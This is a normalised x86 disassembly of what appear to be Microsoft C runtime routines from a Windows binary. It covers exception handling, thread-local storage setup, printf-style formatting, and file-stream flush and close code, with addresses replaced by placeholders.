push [ ebp + 0x14 ]
push esi
call sub_40bd34
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_40f944
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40f944
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_40fcc3
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_40fcc3
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_40bffe
push eax
push edi
call sub_40fb80
pop ecx
pop ecx
sub_40f992
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40f9bc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_413c90
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_413c90
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40fd8b
push 0x1
push edi
call sub_413cac
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_413c90
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_413c90
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_413cac
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_413cac
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_413cac
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_40d490
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_413cc8
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_40fbe7
pop ecx
pop ecx
push eax
push edi
call sub_40d490
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40fbe7
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40bca1
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40fbe7
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40bca8
jmp r-xdata
push eax
call sub_40fbe7
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40fb80
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_40bca1
or [ ebp - 0x4 ] 0xffffffff
sub_40fbe7
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40fc10
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_40c021
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_40c021
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40fc5c
push esi
call sub_40e815
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_4127db
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_40fcb0
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_40fcc3
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_4127db
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_40cb90
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_40fcb0
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40fd2a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_40fcc3
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_40fcc3
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_41248c
push 0x16
call sub_415350
pop ecx
pop ecx
push 0x3
call sub_40c7f5
sub_40fd8b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40fd2a
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40fde1
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_4119e8
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_413e13
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_4119e8
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_413dcf
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_413cf7
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40fef9
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_41061a ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4106d8
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4106d8
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_41063a
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_41063a
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4106e5
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4106d8
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4106d8
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_4106d8
pop ecx
xor edx edx
call sub_4106d8
pop ecx
jmp r-xdata
call sub_4106d8
pop ecx
movzx eax ax
jmp r-xdata
call sub_4106d8
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_412760
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_4106d8
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_4106f5
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_413e3c
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4106d8
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_4130e0
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_413070
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_4106a0
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_41066f
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_4106a0
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_41066f
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_41066f
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_4106a0
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_413e3c
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_41063a
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_40fde1
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_41066f
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_41063a
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_4106a0
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_41063a
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_410703
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4127db
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_4127db
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_40cb90
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_4107bf
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_40e83e
pop ecx
retn
sub_4107ee
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_40e83e
pop ecx
retn
sub_410811
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_40e89f
pop ecx
retn
sub_410840
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_40e89f
pop ecx
retn
sub_410863
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4141df
push esi
call sub_4108c0
push esi
mov edi eax
call sub_41423e
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_4108c0
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_41419d
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_40e739
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_41419d
push 0x1
mov edi eax
call sub_41419d
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_41419d
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_41411e
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_410943
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40c218
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_41096e
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_41099c
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_414260
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_41099c
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_4119e8
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
